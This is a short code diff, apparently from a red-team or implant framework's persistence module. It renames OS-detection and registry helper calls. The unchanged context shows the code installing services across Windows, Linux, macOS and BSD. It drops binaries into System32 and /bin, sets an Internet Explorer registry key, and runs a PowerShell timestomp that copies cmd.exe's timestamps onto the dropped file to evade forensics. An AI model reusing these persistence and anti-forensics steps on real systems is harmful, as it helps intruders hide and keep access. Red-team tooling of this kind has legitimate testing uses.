@@ -226,7 +226,7 @@ def is_using_sysvinit():
 def is_using_bsdinit():
     # Lol this is how ansible does it too :shrug:
     # https://github.com/ansible/ansible/blob/386edc666ec2a053b4d576fc4b2deeb46fe492b8/lib/ansible/module_utils/facts/system/service_mgr.py#L124
-    if sys.get_os()['platform'] == "PLATFORM_BSD":
+    if sys.info()['platform'] == "PLATFORM_BSD":
         return True
     return False
 
@@ -365,13 +365,13 @@ def persist_service(service_name, service_desc, executable_path, executable_args
         file.copy(src_path, executable_path)
         launch_daemon(service_name, executable_path, executable_args)
     elif sys.is_windows():
-        if not sys.write_reg("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Main", "DisableFirstRunCustomize", "REG_DWORD", 2):
+        if not windows.write_reg("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Main", "DisableFirstRunCustomize", "REG_DWORD", 2):
             print("failed to write IE first run regkey")
         file.copy(src_path, executable_path)
         sys.shell(f"""powershell /c "\$src = Get-Item 'C:\\Windows\\System32\\cmd.exe'; \$tgt = Get-Item '{executable_path}'; $tgt.CreationTime = $src.CreationTime; $tgt.LastWriteTime = $src.LastWriteTime; $tgt.LastAccessTime = $src.LastAccessTime" """)
         windows_service_manager(
             service_name, windows_display_name, service_desc, executable_path, executable_args)
-    elif sys.get_os()['platform'] == "PLATFORM_BSD":
+    elif sys.info()['platform'] == "PLATFORM_BSD":
         file.copy(src_path, executable_path)
         if is_using_bsdinit():
             bsdinit(service_name, service_desc,
@@ -403,7 +403,7 @@ def get_executable_paths(name):
         return[ "/var/root/"+name]
     elif sys.is_windows():
         return ["C:\\Windows\\System32\\"+name+".exe"] # ok
-    elif sys.get_os()['platform'] == "PLATFORM_BSD":
+    elif sys.info()['platform'] == "PLATFORM_BSD":
         return ["/bin/"+name]
     return False
 
